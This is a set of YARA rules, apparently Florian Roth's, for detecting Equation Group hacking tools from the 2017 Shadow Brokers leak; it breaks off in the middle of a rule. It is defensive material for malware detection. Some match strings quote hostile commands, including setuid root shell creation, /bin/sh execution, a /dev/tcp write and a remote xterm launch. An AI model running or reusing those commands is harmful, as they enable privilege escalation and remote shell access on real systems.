rule SSC_EquationGroup_Toolset_Apr17_put_Implant9x {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "8fcc98d63504bbacdeba0c1e8df82f7c4182febdf9b08c578d1195b72d7e3d5f"
strings:
$s1 = "3&3.3<3A3F3K3V3c3m3" fullword ascii
$op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 }
$op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb }
condition:
( uint16(0) == 0x5a4d and filesize < 20KB and 2 of them )
}
rule SSC_EquationGroup_noclient_3_3_2 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "3cf0eb010c431372af5f32e2ee8c757831215f8836cabc7d805572bb5574fc72"
strings:
$x1 = "127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning" fullword ascii
$x2 = "iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;" fullword ascii
$x3 = "noclient: failed to execute %s: %s" fullword ascii
$x4 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
$s5 = "Attempting connection from 0.0.0.0:" ascii
condition:
( filesize < 1000KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_rc5 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "69e2c68c6ea7be338497863c0c5ab5c77d5f522f0a84ab20fe9c75c7f81318eb"
strings:
$s1 = "Usage: %s [d|e] session_key ciphertext" fullword ascii
$s2 = "where session_key and ciphertext are strings of hex" fullword ascii
$s3 = "d = decrypt mode, e = encrypt mode" fullword ascii
$s4 = "Bad mode, should be 'd' or 'e'" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_PC_Legacy_dll {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "0cbc5cc2e24f25cb645fb57d6088bcfb893f9eb9f27f8851503a1b33378ff22d"
strings:
$op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 }
$op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 }
$op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea }
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_yak_min_install {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "f67214083d60f90ffd16b89a0ce921c98185b2032874174691b720514b1fe99e"
strings:
$s1 = "driver start" fullword ascii
$s2 = "DeviceIoControl Error: %d" fullword ascii
$s3 = "Phlook" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_watcher_linux_i386_v_3_3_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "ce4c9bfa25b8aad8ea68cc275187a894dec5d79e8c0b2f2f3ec4184dc5f402b8"
strings:
$s1 = "invalid option `" fullword ascii
$s8 = "readdir64" fullword ascii
$s9 = "89:z89:%r%opw" fullword wide
$s13 = "Ropopoprstuvwypypop" fullword wide
$s17 = "Missing argument for `-x'." fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 700KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_ntfltmgr {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "3df61b8ef42a995b8f15a0d38bc51f2f08f8d9a2afa1afc94c6f80671cf4a124"
hash2 = "f7a886ee10ee6f9c6be48c20f370514be62a3fd2da828b0dff44ff3d485ff5c5"
hash3 = "980954a2440122da5840b31af7e032e8a25b0ce43e071ceb023cca21cedb2c43"
strings:
$s3 = "wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw" fullword ascii
$s6 = "w+w;w2w0w6w4w.w(wRw" fullword ascii
$op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 }
$op2 = { ff 15 0b 34 00 00 eb 92 }
$op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae }
$op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 }
$op5 = { 8a 40 01 00 c7 47 70 }
$op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 }
$op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 }
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 4 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13"
strings:
$x1 = "[+] Ping returned Target architecture: %s - XOR Key: 0x%08X" fullword ascii
$x2 = ". Sending shellcode to inject DLL" fullword ascii
$x3 = "[-] Error setting ShellcodeFile name" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_eggbasket {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
strings:
$x1 = "# Building Shellcode into exploit." fullword ascii
$x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
$x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}
rule SSC_EquationGroup_evolvingstrategy_1_0_1 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "fe70e16715992cc86bbef3e71240f55c7d73815b4247d7e866c845b970233c1b"
strings:
$s1 = "chown root sh; chmod 4777 sh;" fullword ascii
$s2 = "cp /bin/sh .;chown root sh;" fullword ascii
$l1 = "echo clean up when elevated:" fullword ascii
$x1 = "EXE=$DIR/sbin/ey_vrupdate" fullword ascii
condition:
( filesize < 4KB and 1 of them )
}
rule SSC_EquationGroup_epoxyresin_v1_0_0 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "eea8a6a674d5063d7d6fc9fe07060f35b16172de6d273748d70576b01bf01c73"
strings:
$x1 = "[-] kernel not vulnerable" fullword ascii
$s1 = ".tmp.%d.XXXXXX" fullword ascii
$s2 = "[-] couldn't create temp file" fullword ascii
$s3 = "/boot/System.map-%s" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )
}
rule SSC_EquationGroup_porkclient {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file porkclient"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "5c14e3bcbf230a1d7e2909876b045e34b1486c8df3c85fb582d9c93ad7c57748"
strings:
$s1 = "-c COMMAND: shell command string" fullword ascii
$s2 = "Cannot combine shell command mode with args to do socket reuse" fullword ascii
$s3 = "-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 30KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Regread_1_1_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26"
strings:
$s1 = "[+] Connected to the Registry Service" fullword ascii
$s2 = "f08d49ac41d1023d9d462d58af51414daff95a6a" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_RemoteExecute_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "770663c07c519677316934cf482e500a73540d9933342c425f3e56258e6e6d8b"
strings:
$op1 = { 53 00 63 00 68 00 65 00 64 00 75 00 6C 00 65 00
00 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00
65 00 73 00 41 00 63 00 74 00 69 00 76 00 65 00
00 00 00 00 FF FF FF FF 00 00 00 00 B0 17 00 68
5C 00 70 00 69 00 70 00 65 00 5C 00 53 00 65 00
63 00 6F 00 6E 00 64 00 61 00 72 00 79 00 4C 00
6F 00 67 00 6F 00 6E 00 00 00 00 00 5C 00 00 00
57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00
44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00
6E 00 63 00 61 00 63 00 6E 00 5F 00 6E 00 70 00
00 00 00 00 5C 00 70 00 69 00 70 00 65 00 5C 00
53 00 45 00 43 00 4C 00 4F 00 47 00 4F 00 4E }
condition:
( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "fbe3a4501654438f502a93f51b298ff3abf4e4cad34ce4ec0fad5cb5c2071597"
hash2 = "7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309"
strings:
$s1 = "DEC Pathworks TCPIP service on Windows NT" fullword ascii
$s2 = "<\\\\__MSBROWSE__> G" fullword ascii
$s3 = "<IRISNAMESERVER>" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
hash4 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
strings:
$x1 = "** SendAndReceive ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
$s8 = "Binding to RPC Interface %s over named pipe" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Gen4 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "fe7ce2fdb245c62e4183c728bc97e966a98fdc8ffd795ed09da23f96e85dcdcd"
hash2 = "0989bfe351342a7a1150b676b5fd5cbdbc201b66abcb23137b1c4de77a8f61a6"
hash3 = "270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4"
hash4 = "7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e"
hash5 = "c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0"
hash6 = "9d98e044eedc7272823ba8ed80dff372fde7f3d1bece4e5affb21e16f7381eb2"
hash7 = "dfce29df4d198c669a87366dd56a7426192481d794f71cd5bb525b08132ed4f7"
hash8 = "87fdc6c32b9aa8ae97c7efbbd5c9ae8ec5595079fc1488f433beef658efcb4e9"
hash9 = "722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26"
hash10 = "d94b99908f528fa4deb56b11eac29f6a6e244a7b3aac36b11b807f2f74c6d8be"
hash11 = "4b07d9d964b2c0231c1db7526237631bb83d0db80b3c9574cc414463703462d3"
hash12 = "30b63abde1e871c90df05137ec08df3fa73dedbdb39cb4bd2a2df4ca65bc4e53"
hash13 = "02c1b08224b7ad4ac3a5b7b8e3268802ee61c1ec30e93e392fa597ae3acc45f7"
hash14 = "690f09859ddc6cd933c56b9597f76e18b62a633f64193a51f76f52f67bc2f7f0"
strings:
$x1 = "[+] \"TargetPort\"      %hu" fullword ascii
$x2 = "---<<<  Complete  >>>---" fullword ascii
$x3 = "[+] \"NetworkTimeout\"  %hu" fullword ascii
$op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }
condition:
( uint16(0) == 0x5a4d and filesize < 150KB and ( 1 of ($x*) or 2 of them ) )
}
rule SSC_EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "f265defd87094c95c7d3ddf009d115207cd9d4007cf98629e814eda8798906af"
hash2 = "8d62ca9e6d89f2b835d07deb5e684a576607e4fe3740f77c0570d7b16ebc2985"
hash3 = "634a80e37e4b32706ad1ea4a2ff414473618a8c42a369880db7cc127c0eb705e"
strings:
$s1 = ".dllfD" fullword ascii
$s2 = "Khsppxu" fullword ascii
$s3 = "D$8.exe" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them )
}
rule SSC_EquationGroup_porkserver {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file porkserver"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "7b5f86e289047dd673e8a09438d49ec43832b561bac39b95098f5bf4095b8b4a"
strings:
$s1 = "%s/%s server failing (looping), service terminated" fullword ascii
$s2 = "getpwnam: %s: No such user" fullword ascii
$s3 = "execv %s: %m" fullword ascii
$s4 = "%s/%s: unknown service" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 70KB and 3 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DiBa_Target_2000 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "f9ea8ff5985b94f635d03f3aab9ad4fb4e8c2ad931137dba4f8ee8a809421b91"
strings:
$s1 = "0M1U1Z1p1" fullword ascii
$op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }
$op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }
$op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them )
}
rule SSC_EquationGroup_orleans_stride_sunos5_9_v_2_4_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "6a30efb87b28e1a136a66c7708178c27d63a4a76c9c839b2fc43853158cb55ff"
strings:
$s1 = "_lib_version" fullword ascii
$s2 = ",%02d%03d" fullword ascii
$s3 = "TRANSIT" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_cursehelper_win2k_i686_v_2_2_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "5ac6fde8a06f4ade10d672e60e92ffbf78c4e8db6b5152e23171f6f53af0bfe1"
strings:
$s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}" fullword ascii
$op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } /* Opcode */
$op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 500KB and all of them )
}
rule SSC_EquationGroup_elatedmonkey_1_0_1_1 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "bf7a9dce326604f0681ca9f7f1c24524543b5be8b6fcc1ba427b18e2a4ff9090"
strings:
$x3 = "Usage: $0 ( -s IP PORT | CMD )" fullword ascii
$s5 = "os.execl(\"/bin/sh\", \"/bin/sh\", \"-c\", \"$CMD\")" fullword ascii
$s13 = "PHP_SCRIPT=\"$HOME/public_html/info$X.php\"" fullword ascii
$s15 = "cat > /dev/tcp/127.0.0.1/80 <<END" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 5KB and ( 1 of ($x*) and all of ($s*) ) ) or ( all of them )
}
rule SSC_EquationGroup_cmsd {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file cmsd"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "634c50614e1f5f132f49ae204c4a28f62a32a39a3446084db5b0b49b564034b8"
strings:
$x1 = "usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]" fullword ascii
$x2 = "error: not vulnerable" fullword ascii
$s1 = "port=%d connected! " fullword ascii
$s2 = "xxx.XXXXXX" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 30KB and 1 of ($x*) ) or ( 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_clocksvc {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "c1bcd04b41c6b574a5c9367b777efc8b95fe6cc4e526978b7e8e09214337fac1"
strings:
$x1 = "~debl00l.tmp" fullword ascii
$x2 = "\\\\.\\mailslot\\c54321" fullword ascii
$x3 = "\\\\.\\mailslot\\c12345" fullword ascii
$x4 = "nowMutex" fullword ascii
$s1 = "System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersPrivate" fullword ascii
$s2 = "000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98" ascii
$s3 = "00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88" ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) or 2 of ($s*) ) )
}
rule SSC_EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
strings:
$x1 = "ERROR: TbMalloc() failed for encoded exploit payload" fullword ascii
$x2 = "** EncodeExploitPayload ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
$x4 = "** RunExploit ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
$s6 = "Sending Implant Payload (%d-bytes)" fullword ascii
$s7 = "ERROR: Encoder failed on exploit payload" fullword ascii
$s11 = "ERROR: VulnerableOS() != RET_SUCCESS" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_GangsterThief_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "50b269bda5fedcf5a62ee0514c4b14d48d53dd18ac3075dcc80b52d0c2783e06"
strings:
$s1 = "\\\\.\\%s:" fullword wide
$s4 = "raw_open CreateFile error" fullword ascii
$s5 = "-PATHDELETED-" fullword ascii
$s6 = "(deleted)" fullword wide
$s8 = "NULLFILENAME" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_AdUser_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "fd2efb226969bc82e2e38769a10a8a751138db69f4594a8de4b3c0522d4d885f"
strings:
$s1 = ".?AVFeFinallyFailure@@" fullword ascii
$s2 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Gen3 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4"
hash2 = "7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e"
hash3 = "c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0"
hash4 = "9d98e044eedc7272823ba8ed80dff372fde7f3d1bece4e5affb21e16f7381eb2"
hash5 = "dfce29df4d198c669a87366dd56a7426192481d794f71cd5bb525b08132ed4f7"
hash6 = "87fdc6c32b9aa8ae97c7efbbd5c9ae8ec5595079fc1488f433beef658efcb4e9"
hash7 = "722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26"
hash8 = "d94b99908f528fa4deb56b11eac29f6a6e244a7b3aac36b11b807f2f74c6d8be"
hash9 = "4b07d9d964b2c0231c1db7526237631bb83d0db80b3c9574cc414463703462d3"
hash10 = "30b63abde1e871c90df05137ec08df3fa73dedbdb39cb4bd2a2df4ca65bc4e53"
hash11 = "02c1b08224b7ad4ac3a5b7b8e3268802ee61c1ec30e93e392fa597ae3acc45f7"
hash12 = "690f09859ddc6cd933c56b9597f76e18b62a633f64193a51f76f52f67bc2f7f0"
strings:
$s1 = "Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)" fullword ascii
$s2 = "[-] Could not set \"CredentialType\"" fullword ascii
$op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }
condition:
( uint16(0) == 0x5a4d and filesize < 150KB and 2 of them )
}
rule SSC_EquationGroup_dumppoppy {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file dumppoppy"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "4a5c01590063c78d03c092570b3206fde211daaa885caac2ab0d42051d4fc719"
strings:
$x1 = "Unless the -c (clobber) option is used, if two RETR commands of the" fullword ascii
$x2 = "mywarn(\"End of $destfile determined by \\\"^Connection closed by foreign host\\\"\")" fullword ascii
$l1 = "End of $destfile determined by \"^Connection closed by foreign host"
condition:
( filesize < 20KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
hash3 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
hash4 = "e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2"
hash5 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
strings:
$x1 = "Target is vulnerable" fullword ascii
$x2 = "Target is NOT vulnerable" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )
}
rule SSC_EquationGroup_estopmoonlit {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "707ecc234ed07c16119644742ebf563b319b515bf57fd43b669d3791a1c5e220"
strings:
$x1 = "[+] shellcode prepared, re-executing" fullword ascii
$x2 = "[-] kernel not vulnerable: prctl" fullword ascii
$x3 = "[-] shell failed" fullword ascii
$x4 = "[!] selinux apparently enforcing.  Continue [y|n]? " fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "c8b354793ad5a16744cf1d4efdc5fe48d5a0cf0657974eb7145e0088fcf609ff"
hash2 = "5f06ec411f127f23add9f897dc165eaa68cbe8bb99da8f00a4a360f108bb8741"
strings:
$s1 = "\\system32\\win32k.sys" fullword wide
$s2 = "hKeAddSystemServiceTable" fullword ascii
$s3 = "hPsDereferencePrimaryToken" fullword ascii
$s4 = "CcnFormSyncExFBC" fullword wide
$s5 = "hPsDereferencePrimaryToken" fullword ascii
$op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b }
$op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 }
$op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 }
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and ( 4 of ($s*) or all of ($op*) ) )
}
rule SSC_EquationGroup_xspy {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file xspy"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "841e065c9c340a1e522b281a39753af8b6a3db5d9e7d8f3d69e02fdbd662f4cf"
strings:
$s1 = "USAGE: xspy -display <display> -delay <usecs> -up" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 60KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DllLoad_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "a42d5201af655e43cefef30d7511697e6faa2469dc4a74bc10aa060b522a1cf5"
strings:
$s1 = "BzWKJD+" fullword ascii
$op1 = { 44 24 6c 6c 88 5c 24 6d }
$op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 }
$op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e }
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
hash4 = "e702223ab42c54fff96f198611d0b2e8a1ceba40586d466ba9aadfa2fd34386e"
strings:
$x2 = "** CreatePayload ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}
rule SSC_EquationGroup_smash {
meta:
